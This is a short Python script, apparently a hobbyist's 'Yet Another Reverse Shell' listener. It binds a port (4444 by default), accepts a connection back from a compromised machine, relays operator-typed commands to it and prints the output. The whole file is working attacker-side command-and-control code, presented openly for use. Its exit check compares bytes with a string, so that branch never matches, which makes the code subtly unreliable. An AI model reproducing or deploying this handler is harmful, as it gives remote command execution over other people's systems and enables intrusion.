#!/usr/bin/python3

from socket import *
import argparse

# add some args for easily changing locations, ports etc.
parser = argparse.ArgumentParser()
parser.add_argument("--host", required=False, default='')
parser.add_argument("--port", type=int, required=False, default=4444)
parser.add_argument("--prompt", required=False, default='yars> ') # Yet Another Reverse Shell
parser.add_argument("--buffer_size", type=int, required=False, default=1024)
args = parser.parse_args()

s = socket() # get a socket.

try:
    s.bind((args.host, args.port)) # interface binding
    s.listen(5) # Listen for new conns
    print("[*] Listening on 0.0.0.0:%s" % str(args.port))
    conn, addr = s.accept() # new conn object
    print("[*] Shell from: %s" % str(addr))

    banner = "Welcome!!!".encode() # noisy banner for debugging and noise
    conn.send(banner)
    data = conn.recv(args.buffer_size).decode() # decode first data from the stream for a banner msg

    while True:
        # get the raw command from prompt
        command = input(args.prompt).encode()

        # send the command to the client
        conn.send(command)
        if command.lower() == "exit":
            # listen for only exit to kill the loop. can extend this someday perhaps.
            break
        # retrieve command results
        results = conn.recv(args.buffer_size).decode()
        # print them
        print(results)

    # close connection to the client
    conn.close()
    # close server connection
    s.close()


except KeyboardInterrupt: 
    print("[*] ...listener terminated using [ctrl+c], closing the conn.")
    # close server connection
    s.close()
    exit() # Using [ctrl+c] will terminate the listener.
